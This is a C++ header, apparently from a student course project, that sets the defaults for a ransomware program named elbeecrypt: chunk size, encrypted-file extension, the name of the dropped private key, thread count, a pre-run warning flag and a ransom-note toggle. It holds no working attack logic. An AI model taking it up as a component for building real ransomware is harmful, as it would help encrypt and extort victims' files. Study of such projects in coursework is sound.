#pragma once

#include <string>

/**
 * @brief Contains the default settings for the ransomware.
 * 
 * @author CECS-378 Group 10
 * @file settings.hpp
 */
namespace elbeecrypt::common::Settings {
	/** The size of the chunks used in the cryptor engine (0.5 MB by default). */
	const uint32_t CRYPTO_CHUNK_SIZE = 524300;

	/** The extension to use for encrypted files. */
	const std::string ENCRYPTED_EXTENSION = "elbeecrypt";

	/** The name of the private key to drop. */
	const std::string ENCRYPTION_KEY_NAME = "elbeecrypt-privkey_{pubkeyFingerprint}.elbeecrypt-key";

	/** The amount of worker threads that should be spawned to encrypt or decrypt files. */
	constexpr uint8_t ENCRYPTION_THREADS = 10;

	/** Whether there should be a warning before running. */
	constexpr bool SAFETY_NET = true;

	/** Whether there should be ransom notes dropped in every directory that the ransomware hit. */
	constexpr bool SPAM_RANSOM_NOTES = false;
}